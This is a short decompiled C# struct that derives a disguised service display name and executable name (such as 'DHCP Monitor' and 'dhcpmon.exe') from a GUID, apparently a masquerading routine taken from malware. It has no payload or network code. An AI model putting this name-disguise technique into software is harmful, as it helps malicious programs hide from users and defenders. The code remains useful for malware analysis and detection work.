using System;

// Token: 0x02000023 RID: 35
public struct GStruct1
{
	// Token: 0x06000107 RID: 263 RVA: 0x00007280 File Offset: 0x00005480
	public static GStruct1 smethod_0(Guid guid_0)
	{
		Random random = new Random(GStruct1.smethod_1(guid_0));
		int num = random.Next(GStruct1.string_2.Length);
		string text = GStruct1.string_2[num];
		string arg = GStruct1.string_3[num];
		string text2 = string.Empty;
		do
		{
			text2 = GStruct1.string_4[random.Next(GStruct1.string_4.Length)];
		}
		while (text2[text2.Length - 1] == text[0]);
		return new GStruct1
		{
			string_0 = string.Format("{0} {1}", text2.ToUpper(), arg),
			string_1 = string.Format("{0}{1}.exe", text2, text)
		};
	}

	// Token: 0x06000108 RID: 264 RVA: 0x00007328 File Offset: 0x00005528
	private static int smethod_1(Guid guid_0)
	{
		byte[] array = guid_0.ToByteArray();
		int num = BitConverter.ToInt32(array, 0);
		int num2 = 4;
		int num3 = array.Length - 1;
		for (int i = num2; i <= num3; i++)
		{
			num ^= (int)array[i];
		}
		return num;
	}

	// Token: 0x04000059 RID: 89
	public string string_0;

	// Token: 0x0400005A RID: 90
	public string string_1;

	// Token: 0x0400005B RID: 91
	private static string[] string_2 = new string[]
	{
		"ss",
		"mon",
		"mgr",
		"sv",
		"svc",
		"host"
	};

	// Token: 0x0400005C RID: 92
	private static string[] string_3 = new string[]
	{
		"Subsystem",
		"Monitor",
		"Manager",
		"Service",
		"Service",
		"Host"
	};

	// Token: 0x0400005D RID: 93
	private static string[] string_4 = new string[]
	{
		"dhcp",
		"upnp",
		"tcp",
		"udp",
		"saas",
		"iss",
		"smtp",
		"dos",
		"dpi",
		"pci",
		"scsi",
		"wan",
		"lan",
		"nat",
		"imap",
		"nas",
		"ntfs",
		"wpa",
		"dsl",
		"agp",
		"arp",
		"ddp",
		"dns"
	};
}
